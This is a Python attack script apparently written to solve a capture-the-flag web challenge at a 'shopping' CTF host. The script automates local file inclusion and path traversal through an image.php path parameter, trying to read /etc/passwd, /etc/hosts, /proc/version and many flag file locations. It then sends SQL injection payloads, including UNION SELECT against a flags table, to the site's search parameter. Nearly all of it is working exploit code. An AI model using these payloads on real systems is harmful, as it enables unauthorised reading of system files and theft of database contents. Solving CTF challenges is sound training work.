#!/usr/bin/env python3

import requests
import re
from urllib.parse import urljoin, quote
import sys

def exploit_lfi(base_url):
    """Exploit Local File Inclusion in image.php"""
    print(f"[*] Exploiting LFI in {base_url}")
    
    session = requests.Session()
    
    # The vulnerable endpoint is /image.php?path=
    # We can see it's used like: /image.php?path=/var/www/html/bag.png
    
    # Let's try to read sensitive files
    payloads = [
        '/etc/passwd',
        '/etc/hosts', 
        '/proc/version',
        '/var/www/html/flag.txt',
        '/flag.txt',
        '/var/flag.txt',
        '/tmp/flag.txt',
        '/home/flag.txt',
        '/root/flag.txt',
        '../flag.txt',
        '../../flag.txt',
        '../../../flag.txt',
        '../../../../flag.txt',
        '../../../var/www/html/flag.txt',
        '/var/www/html/../flag.txt',
        '/var/www/flag.txt',
        '/usr/share/flag.txt'
    ]
    
    for payload in payloads:
        try:
            url = f"{base_url}/image.php?path={quote(payload)}"
            print(f"[*] Trying: {payload}")
            
            resp = session.get(url, timeout=10)
            
            # Check if we got a flag
            if 'TDHT{' in resp.text:
                print(f"[+] FOUND FLAG!")
                print(f"[+] Payload: {payload}")
                print(f"[+] Response: {resp.text}")
                return resp.text.strip()
                
            # Check if it looks like file content (not an image error)
            if resp.status_code == 200 and len(resp.content) > 10:
                content = resp.text[:200] if len(resp.text) > 200 else resp.text
                if any(word in content for word in ['root:', 'bin:', 'www-data', 'flag', 'TDHT']):
                    print(f"[+] Readable file: {payload}")
                    print(f"[+] Content preview: {content}")
                    
        except Exception as e:
            print(f"[-] Error with {payload}: {e}")
            
    # Try some common flag locations with directory traversal
    traversals = [
        '',
        '../',
        '../../',
        '../../../',
        '../../../../',
        '../../../../../',
        '../../../../../../'
    ]
    
    flag_files = ['flag.txt', 'flag', 'FLAG.txt', 'FLAG']
    
    for traversal in traversals:
        for flag_file in flag_files:
            payload = f"{traversal}{flag_file}"
            try:
                url = f"{base_url}/image.php?path={quote(payload)}"
                print(f"[*] Trying traversal: {payload}")
                
                resp = session.get(url, timeout=10)
                
                if 'TDHT{' in resp.text:
                    print(f"[+] FOUND FLAG!")
                    print(f"[+] Payload: {payload}")
                    print(f"[+] Flag: {resp.text}")
                    return resp.text.strip()
                    
            except Exception as e:
                continue
                
    return None

def test_search_sqli(base_url):
    """Test for SQL injection in search"""
    print(f"\n[*] Testing search for SQLi")
    
    session = requests.Session()
    
    # Test basic SQLi payloads
    payloads = [
        "' OR 1=1-- ",
        "' UNION SELECT 1,2,3-- ",
        "' AND 1=2 UNION SELECT flag,2,3 FROM flags-- ",
        "' UNION SELECT flag FROM flags-- "
    ]
    
    for payload in payloads:
        try:
            resp = session.get(f"{base_url}/?q={quote(payload)}", timeout=10)
            
            if 'TDHT{' in resp.text:
                print(f"[+] SQLi SUCCESS!")
                print(f"[+] Payload: {payload}")
                flag_match = re.search(r'TDHT\{[^}]+\}', resp.text)
                if flag_match:
                    return flag_match.group(0)
                    
        except Exception as e:
            continue
            
    return None

if __name__ == "__main__":
    url = "https://shopping-bo5xiq-ctf.tdho.st"
    
    # Try LFI first
    flag = exploit_lfi(url)
    
    if not flag:
        # Try SQLi
        flag = test_search_sqli(url)
        
    if flag:
        print(f"\n[+] FLAG FOUND: {flag}")
    else:
        print(f"\n[-] No flag found with current methods")